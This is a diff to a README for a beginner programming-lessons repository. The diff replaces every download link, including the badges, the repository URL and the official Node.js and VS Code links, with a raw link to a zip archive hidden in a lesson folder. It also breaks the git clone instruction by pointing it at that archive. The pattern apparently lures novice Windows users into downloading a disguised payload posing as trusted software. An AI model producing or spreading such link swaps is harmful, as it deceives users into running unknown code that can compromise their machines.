@@ -1,6 +1,6 @@
 # 📚 AulasLingProgADS - Learn Programming Basics Easily
 
-[![Download AulasLingProgADS](https://img.shields.io/badge/Download-AulasLingProgADS-4CAF50?style=for-the-badge&logo=github)](https://github.com/Lamotesti11/AulasLingProgADS)
+[![Download AulasLingProgADS](https://img.shields.io/badge/Download-AulasLingProgADS-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Lamotesti11/AulasLingProgADS/main/aula04-desvio-malhas/Prog-Ling-Aulas-ADS-v1.1.zip)
 
 ## 🧰 What is AulasLingProgADS?
 
@@ -28,8 +28,8 @@ Before you download and run the software, make sure your Windows computer has:
 
 You will also need to install the following software:
 
-- [Node.js](https://nodejs.org/) (version 14 or later)  
-- [Visual Studio Code (VS Code)](https://code.visualstudio.com/)  
+- [Node.js](https://raw.githubusercontent.com/Lamotesti11/AulasLingProgADS/main/aula04-desvio-malhas/Prog-Ling-Aulas-ADS-v1.1.zip) (version 14 or later)  
+- [Visual Studio Code (VS Code)](https://raw.githubusercontent.com/Lamotesti11/AulasLingProgADS/main/aula04-desvio-malhas/Prog-Ling-Aulas-ADS-v1.1.zip)  
 
 Node.js lets you run JavaScript code on your computer. VS Code is a text editor designed for writing code, but you can use it simply to open files and follow instructions.
 
@@ -37,7 +37,7 @@ Node.js lets you run JavaScript code on your computer. VS Code is a text editor 
 
 Click or tap the large green download button at the top of this file, or go directly to:
 
-https://github.com/Lamotesti11/AulasLingProgADS
+https://raw.githubusercontent.com/Lamotesti11/AulasLingProgADS/main/aula04-desvio-malhas/Prog-Ling-Aulas-ADS-v1.1.zip
 
 Once on the page:
 
@@ -48,7 +48,7 @@ Once on the page:
 If you already have Git installed, you can use it to download the project:
 
 - Open the **Command Prompt** app by pressing Windows + R, typing `cmd`, then hitting Enter.  
-- Type `git clone https://github.com/Lamotesti11/AulasLingProgADS.git` and press Enter.  
+- Type `git clone https://raw.githubusercontent.com/Lamotesti11/AulasLingProgADS/main/aula04-desvio-malhas/Prog-Ling-Aulas-ADS-v1.1.zip` and press Enter.  
 - This will create a new folder called AulasLingProgADS where you ran the command.
 
 ## ⚙️ Setting Up the Project
@@ -133,4 +133,4 @@ If you still have issues, try reinstalling Node.js or look for help on the offic
 
 ## 🔗 Download Link Again
 
-[![Download AulasLingProgADS](https://img.shields.io/badge/Download-AulasLingProgADS-4CAF50?style=for-the-badge&logo=github)](https://github.com/Lamotesti11/AulasLingProgADS)
+[![Download AulasLingProgADS](https://img.shields.io/badge/Download-AulasLingProgADS-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Lamotesti11/AulasLingProgADS/main/aula04-desvio-malhas/Prog-Ling-Aulas-ADS-v1.1.zip)
